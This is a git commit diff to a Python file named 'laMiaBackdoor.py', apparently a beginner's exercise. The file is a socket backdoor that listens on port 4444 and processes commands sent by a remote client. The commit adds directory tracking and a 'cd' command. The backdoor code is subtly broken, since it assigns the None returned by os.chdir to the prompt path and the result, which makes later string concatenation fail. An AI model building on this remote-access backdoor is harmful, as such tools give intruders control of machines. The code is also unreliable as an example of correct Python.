fb36221cc4d614e5544173c0e728571c85dc963c
Paolo Rampino <liadserv@gmail.com>
2024-11-14 04:55:56 -0500

    up

--- laMiaBackdoor.py
+++ laMiaBackdoor.py
@@ -1,4 +1,5 @@
 import socket as so
+import os
 
 SRV_ADDR = ""
 SRV_PORT = 4444
@@ -8,18 +9,21 @@ s.listen(1)
 print("Sto attendendo una connessione...")
 connection, address = s.accept()
 print("Ho stabilito una connessione con: ", address)
+percorso_partenza = os.getcwd() 
 while True:
-    prompt = "$ "
+    prompt = percorso_partenza + " $ "
     connection.sendall(prompt.encode("utf-8"))
     data = connection.recv(1024)
     if not data: break
     comando = data.decode("utf-8")
     result = ""
-    if (comando == 'ls'):
-        result = "Mi spiace, non ancora disponibile"
+    if (comando.startswith('cd')):
+        percorso_partenza = os.chdir(comando.replace("cd ","").replace('\n', ''))
+        result = percorso_partenza
     elif (comando.startswith('rm')):
         result = "Ci hai provato!"
     else:
         result = "Non trovato"
+    result = result + "\n"
     connection.sendall(result.encode("utf-8"))
 connection.close()
